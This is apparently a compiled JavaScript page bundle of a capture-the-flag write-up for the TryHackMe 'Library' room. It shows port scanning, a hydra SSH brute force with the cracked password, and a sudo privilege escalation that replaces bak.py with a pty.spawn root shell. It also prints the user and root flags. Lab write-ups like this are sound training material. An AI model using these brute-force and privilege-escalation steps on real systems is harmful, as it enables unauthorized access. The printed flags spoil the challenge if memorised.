"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8717],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>b});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),u=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=u(e.components);return r.createElement(l.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),c=u(n),m=a,b=c["".concat(l,".").concat(m)]||c[m]||d[m]||o;return n?r.createElement(b,i(i({ref:t},p),{},{components:n})):r.createElement(b,i({ref:t},p))}));function b(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=m;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[c]="string"==typeof e?e:a,i[1]=s;for(var u=2;u<o;u++)i[u]=n[u];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},89311:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>u});var r=n(87462),a=(n(67294),n(3905));const o={},i="Library",s={unversionedId:"Tryhackme/Library/Library",id:"Tryhackme/Library/Library",title:"Library",description:"boot2root machine for FIT and bsides guatemala CTF",source:"@site/writeups/Tryhackme/Library/Library.md",sourceDirName:"Tryhackme/Library",slug:"/Tryhackme/Library/",permalink:"/writeups/Tryhackme/Library/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lian_Yu",permalink:"/writeups/Tryhackme/Lian_Yu/Lian Yu"},next:{title:"Linux Challenges",permalink:"/writeups/Tryhackme/Linux Challenges/"}},l={},u=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Library",id:"task-1-library",level:2}],p={toc:u},c="wrapper";function d(e){let{components:t,...n}=e;return(0,a.kt)(c,(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"library"},"Library"),(0,a.kt)("p",null,"boot2root machine for FIT and bsides guatemala CTF"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bsidesgtlibrary"},"Library")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (SSH)"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries"),(0,a.kt)("li",{parentName:"ul"},"Python Scripting (Rev Shell)")),(0,a.kt)("h2",{id:"task-1-library"},"Task 1 Library"),(0,a.kt)("p",null,"Read user.txt and root.txt"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Library$ sudo nmap -A -sS -sC -sV -O 10.10.163.174\n[sudo] password for kali: \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:59 CEST\nNmap scan report for 10.10.163.174\nHost is up (0.065s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)\n|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)\n|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Welcome to  Blog - Library Machine\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=44597%PV=Y%DS=2%DC=T%G=Y%TM=5F8712\nOS:8D%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 199/tcp)\nHOP RTT      ADDRESS\n1   68.47 ms 10.8.0.1\n2   68.58 ms 10.10.163.174\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 37.05 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Library$ sudo /opt/dirsearch/dirsearch.py -u 10.10.163.174 -w /usr/share/dirb/wordlists/common.txt -e html,php\n[sudo] password for kali: \n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613\n\nError Log: /opt/dirsearch/logs/errors-20-10-14_17-00-31.log\n\nTarget: 10.10.163.174\n\nOutput File: /opt/dirsearch/reports/10.10.163.174/_20-10-14_17-00-31.txt\n\n[17:00:31] Starting: \n[17:00:39] 301 -  315B  - /images  ->  http://10.10.163.174/images/\n[17:00:39] 200 -    5KB - /index.html\n[17:00:42] 200 -   33B  - /robots.txt\n[17:00:43] 403 -  301B  - /server-status\n\nTask Completed\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.163.174/robots.txt"},"http://10.10.163.174/robots.txt")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"User-agent: rockyou \nDisallow: /\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"meliodas\nroot\nwww-data\nAnonymous\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Library$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.174\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 17:04:02\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.163.174:22/\n[STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344223 to do in 1335:36h, 16 active\n[22][ssh] host: 10.10.163.174   login: meliodas   password: iloveyou1\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 4 final worker threads did not complete until end.\n[ERROR] 4 targets did not resolve or could not be connected\n[ERROR] 0 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 17:05:43\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Library$ ssh meliodas@10.10.163.174\nThe authenticity of host '10.10.163.174 (10.10.163.174)' can't be established.\nECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.163.174' (ECDSA) to the list of known hosts.\nmeliodas@10.10.163.174's password: \nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\nLast login: Sat Aug 24 14:51:01 2019 from 192.168.15.118\nmeliodas@ubuntu:~$ ls\nbak.py  user.txt\nmeliodas@ubuntu:~$ cat user.txt\n6d488cbb3f111d135722c33cb635f4ec\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"meliodas@ubuntu:~$ sudo -l\nMatching Defaults entries for meliodas on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser meliodas may run the following commands on ubuntu:\n    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py\nmeliodas@ubuntu:~$ cat bak.py \n#!/usr/bin/env python\nimport os\nimport zipfile\n\ndef zipdir(path, ziph):\n    for root, dirs, files in os.walk(path):\n        for file in files:\n            ziph.write(os.path.join(root, file))\n\nif __name__ == '__main__':\n    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)\n    zipdir('/var/www/html', zipf)\n    zipf.close()\nmeliodas@ubuntu:~$ ls -la\ntotal 40\ndrwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .\ndrwxr-xr-x 3 root     root     4096 Aug 23  2019 ..\n-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py\n-rw------- 1 root     root       44 Aug 23  2019 .bash_history\n-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout\n-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc\ndrwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache\ndrwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano\n-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile\n-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful\n-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt\nmeliodas@ubuntu:~$ rm -f bak.py\nmeliodas@ubuntu:~$ cat > bak.py << EOF\n> #!/usr/bin/env python\n> import pty\n> pty.spawn(\"/bin/bash\")\n> EOF\nmeliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py\nroot@ubuntu:~# cd /root\nroot@ubuntu:/root# ls\nroot.txt\nroot@ubuntu:/root# cat root.txt\ne8c8c6c256c35515d1d344ee0488c617\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"user.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"6d488cbb3f111d135722c33cb635f4ec")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"root.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"e8c8c6c256c35515d1d344ee0488c617")))}d.isMDXComponent=!0}}]);